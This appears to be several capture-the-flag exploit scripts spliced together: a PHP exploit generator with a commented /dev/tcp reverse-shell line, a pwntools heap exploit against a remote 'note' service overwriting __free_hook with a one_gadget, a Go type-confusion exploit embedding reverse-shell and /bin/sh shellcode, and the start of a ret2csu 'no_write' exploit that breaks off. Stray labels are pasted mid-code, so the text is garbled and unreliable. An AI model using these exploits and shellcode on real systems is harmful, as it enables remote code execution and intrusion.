def show(idx):
    global code
    # ttt_show may leak addr, you could assign it to a variable. eg: $a = 
ttt_show(1);
    code += "$a = ttt_show("+str(idx)+");"
def u64x():
    global code
    code += "$a = strrev($a);"
    code += "$a = bin2hex($a);"
    code += "echo '0x'.$a;"
    code += "$a = hexdec('0x'.$a);"
    code += "$a = $a-0x78;"
    code += "echo $a;"
def p64x():
    global code
    code += '$realloc_hook = pack("LL", $a & 0xffffffff, $a >> 32);'
def pwn():
    global code
    code += "die(0);"
    f = open("./exp.php","w")
    # f.write("& /dev/tcp/xxxxxxxxx/9999 0>&1"\x00')
alloc(3,0x20)
edit(3,'tttpwnit')
note
hitcon lazyhouseeditlarge bin attack
backdoor(4)
# end here
pwn()
from pwn import *
#r = process('./note')
r = remote('124.156.135.103',6004)
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
libc = ELF('./libc.so')
rn = lambda n : r.recv(n)
ra = lambda : r.recv()
ru = lambda s : r.recvuntil(s)
rl = lambda : r.recvline()
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
def add(idx,size):
    ru("Choice: ")
    sl("1")
    ru("Index: ")
    sl(str(idx))
    ru("Size: ")
    sl(str(size))
def free(idx):
    ru("Choice: ")
    sl('2')
    ru("Index: ")
    sl(str(idx))
def show(idx):
    ru("Choice: ")
    sl('3')
    ru("Index: ")
    sl(str(idx))
def edit(idx,content):
    ru("Choice: ")
    sl('4')
    ru("Index: ")
    sl(str(idx))
    ru("Message:")
    sd(content)
def just1(idx,content):
    ru("Choice: ")
    sl('7')
    ru("Index: ")
    sl(str(idx))
    ru("Message:")
    sd(content)
def aim(content):
    ru("Choice: ")
    sl('6')
    ru("Give a super name: ")
    sd(content)
add(0,21524788884141834)
free(0)
add(0, 0x88)
add(1, 0x248)
add(2, 0x248)
add(6, 0x248)
add(3, 0x88)
add(7, 0x88)
add(4, 0x448)
for i in range(7):
    add(5, 0x248)
    free(5)
just1(0, b'a' * 0x80 + p64(0) + p64(0x781))
free(1)
add(1, 0x338)
edit(1,b'b' * 0x240 + p64(0) + p64(0x251)+b"\n")
add(5, 0x600)
show(2)
rn(0xf0)
libc_addr = u64(rn(8)) - 1120 - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))
rn(8)
heap_addr = u64(rn(8)) & 0xfffffffffffff000
log.success('heap_addr: ' + hex(heap_addr))
free(2)
add(2,0x248)
edit(2, b'c' * 0xe0 + p64(0) + p64(0x441) + p64(libc_addr + 0x1e50a0) + 
p64(libc_addr + 0x1e50a0) + p64(0) + p64(libc_addr + 0x1e7600 - 0x20)+b'\n')
free(4)
add(4, 0x88)
free(4)
free(2)
edit(1, b'd' * 0x240 + p64(0) + p64(0x251) + p64(heap_addr)+b"\n")
add(2, 0x248)
golang_interface
add(4, 0x248)
edit(4, p64(0x0000000200000000)+b'\x00'*0x58+p64(libc_addr 
+libc.symbols['__free_hook'])+b'\n')
one_gadget = libc_addr+0x106ef8
aim(p64(one_gadget)+b'\n')
free(0)
r.interactive()
package main
// 
// 
type itf interface {
  X() bool
  L() uint64
}
type safe struct {
  f *uint64
}
type unsafe struct {
  f func(string) bool
}
var good itf
var bad itf
var confused itf
func (s *safe) X() bool {
  return false
}
func (s *safe) L() uint64 {
  return *s.f 
}
var sc string
func (u *unsafe) X() bool {
  if u.f != nil {
    u.f(sc)
  }
  return false
}
func (u *unsafe) L() uint64 {
  return 0
}
var pp uint64
var val uint64 
func boolfunc(sc string) bool {
  return pp == 12345
}
func runsc(sc string) []int {
  x0 := 0x05eb909090909090
  x1 := 0x06eb9008247c8b48
  x2 := 0x06eb90900cefc148
  x3 := 0x06eb90900ce7c148
  x4 := 0x06eb9000001000be
  x5 := 0x06eb9000000007ba
  x6 := 0x06eb900000000ab8
  x7 := 0x0000082464ff050f
  return []int{x0,x1,x2,x3,x4,x5,x6,x7}
}
func main() {
  pp = 0x0000000000133337
  good = &safe{f: &pp}
  bad = &unsafe{f: boolfunc}
  f := runsc
  confused = good 
  go func() {
    var i int
    for {
      confused = bad
      confused = good
      i++
      if i > 100000 {
        break
      }
    }
  }()
  for {
    val = confused.L()
no_write
write
    if val != pp && val != 0 {
      break 
    }
  }
  pp = val + 0x5a
  //sc = 
"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x
01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\
x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
  sc = 
"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x48\x89\xc5\x48\xb8\x01\x01\x
01\x01\x01\x01\x01\x01\x50\x48\xb8\x03\x01\x26\x0e\x02\x71\x25\x37\x48\x31\x04\
x24\x6a\x2a\x58\x48\x89\xef\x6a\x10\x5a\x48\x89\xe6\x0f\x05\x6a\x03\x5d\x6a\x03
\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x4
8\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x
34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\
xd2\x6a\x3b\x58\x0f\x05"
  for {
    ret := confused.X()
    if ret == true {
      break
    }
  }
  f(sc)
}
from pwn import *
#context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
rn = lambda n : r.recv(n)
ra = lambda : r.recv()
ru = lambda s : r.recvuntil(s)
rl = lambda : r.recvline()
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
def call_func(r12, r13, r14,r15):
    buf = p64(0x40076A)
    buf += p64(0) # rbx
    buf += p64(1) # rbp
    buf += p64(r12) # func_addr
    buf += p64(r13) # edi
    buf += p64(r14) # rsi
    buf += p64(r15) # rdx
    buf += p64(0x400750)
    buf += b'\x00' * 56
    return buf
flag = ''
while(1):
    i=0x29
    while(1):
        #r = process("./no_write")